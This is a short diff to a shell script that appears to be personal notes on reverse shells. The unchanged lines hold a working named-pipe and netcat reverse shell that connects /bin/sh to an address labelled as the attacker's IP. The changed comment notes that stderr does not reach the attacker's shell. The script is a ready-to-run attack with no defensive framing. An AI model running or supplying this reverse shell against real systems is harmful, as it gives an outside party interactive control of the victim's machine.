@@ -1,7 +1,7 @@
 touch HelloWorld
 
 #attacker IP:192.168.180.134
-#work
+#work --- but stderr will not output in the attacker's shell, but do in the orignal shell
 rm /tmp/backpipe ; mknod /tmp/backpipe p
 /bin/sh 0</tmp/backpipe | nc 192.168.180.134 1234 1>/tmp/backpipe &
 
